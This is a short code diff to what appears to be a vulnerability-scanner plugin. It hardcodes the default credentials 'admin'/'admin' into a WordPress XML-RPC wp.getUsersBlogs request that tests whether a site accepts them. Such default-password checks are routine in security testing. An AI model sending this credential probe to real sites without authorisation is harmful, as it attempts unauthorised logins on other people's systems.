@@ -33,6 +33,8 @@ def fingerprint(url):
 # Proof of Concept
 def poc(url):
     result = {}
+    username = "admin"
+    password = "admin"
     try:
         url = format_url(url)
 
@@ -43,13 +45,13 @@ def poc(url):
    <methodName>wp.getUsersBlogs</methodName>
    <params>
      <param>
-       <value>{{username}}</value>
+       <value>{username}</value>
      </param>
        <param>
-     <value>{{password}}</value>
+     <value>{password}</value>
        </param>
    </params>
- </methodCall>"""
+ </methodCall>""".format(username=username, password=password)
         headers = {'Content-Length': '235'}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
